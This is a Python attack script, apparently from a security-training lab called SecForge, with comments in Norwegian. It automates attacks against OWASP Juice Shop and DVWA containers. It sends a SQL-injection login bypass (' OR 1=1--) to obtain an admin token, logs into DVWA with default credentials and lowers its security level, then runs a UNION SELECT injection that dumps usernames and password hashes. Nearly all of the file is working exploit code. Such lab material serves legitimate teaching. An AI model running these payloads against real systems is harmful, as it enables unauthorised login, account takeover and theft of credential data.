#!/usr/bin/env python3
"""SecForge – automatiske angrep mot lab-målene (kjøres inne i attacker-boksen).
Bruker kun Python-standardbibliotek."""
import json, urllib.request, urllib.parse, urllib.error, http.cookiejar as cj, re, time

def http(url, data=None, headers=None, jar=None, timeout=30):
    h = headers or {}
    body = data.encode() if isinstance(data, str) else data
    req = urllib.request.Request(url, data=body, headers=h)
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar)) if jar is not None \
             else urllib.request.build_opener()
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return None, f"[feil] {e}"

def wait_for(url, label, tries=40):
    for _ in range(tries):
        s, _b = http(url, timeout=8)
        if s: return True
        time.sleep(3)
    print(f"  (!) {label} svarte ikke i tide"); return False

# ---------------------------------------------------------------- JUICE SHOP
print("### JUICE-SHOP – SQL-injection (innloggings-bypass)")
JS = "http://juice-shop:3000"
wait_for(JS + "/rest/admin/application-version", "Juice Shop")
payload = {"email": "' OR 1=1--", "password": "hva-som-helst"}
s, b = http(JS + "/rest/user/login", data=json.dumps(payload),
            headers={"Content-Type": "application/json"})
print(f"  Payload e-post: {payload['email']}")
try:
    auth = json.loads(b)["authentication"]
    print(f"  => INNLOGGET UTEN PASSORD som: {auth.get('umail')}")
    print(f"  => Fikk gyldig JWT-token: {auth['token'][:40]}...")
except Exception as e:
    print(f"  (kunne ikke tolke svar: {e}) rådata: {b[:200]}")
s, b = http(JS + "/api/Products")
try:
    print(f"  => Produktkatalog via API: {len(json.loads(b)['data'])} produkter hentet ut uten innlogging")
except Exception:
    pass

# ---------------------------------------------------------------- DVWA
print("\n### DVWA – SQL-injection (dumper brukernavn + passord-hasher)")
D = "http://dvwa"
jar = cj.CookieJar()
def token(html):
    m = re.search(r"user_token'\s*value='([0-9a-f]+)'", html) or \
        re.search(r'user_token"\s*value="([0-9a-f]+)"', html)
    return m.group(1) if m else ""
def form(path, fields):
    s, b = http(D + path, jar=jar)
    fields = dict(fields); fields["user_token"] = token(b)
    return http(D + path, data=urllib.parse.urlencode(fields),
                headers={"Content-Type": "application/x-www-form-urlencoded"}, jar=jar)

wait_for(D + "/login.php", "DVWA")
form("/login.php", {"username": "admin", "password": "password", "Login": "Login"})
s, idx = http(D + "/index.php", jar=jar)
print("  Innlogging: " + ("OK (admin/password)" if "Logout" in idx else "feilet"))
form("/setup.php", {"create_db": "Create / Reset Database"})
print("  Databasen opprettet/nullstilt")
form("/security.php", {"security": "low", "seclev_submit": "Submit"})
inj = "1' UNION SELECT user, password FROM users-- -"
q = urllib.parse.urlencode({"id": inj, "Submit": "Submit"})
s, b = http(D + "/vulnerabilities/sqli/?" + q, jar=jar)
print(f"  Payload: {inj}")
rows = re.findall(r"First name:\s*([^<]*)<br[^>]*>\s*Surname:\s*([^<\n]*)", b, re.I)
if rows:
    print("  => DUMPET FRA users-tabellen (brukernavn : passord-hash):")
    for u, h in rows:
        print(f"       {u.strip()} : {h.strip()}")
else:
    print(f"  (ingen rader tolket – HTTP {s}, svarlengde {len(b)})")
    snip = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", b))
    print("    utdrag: " + snip[:300])
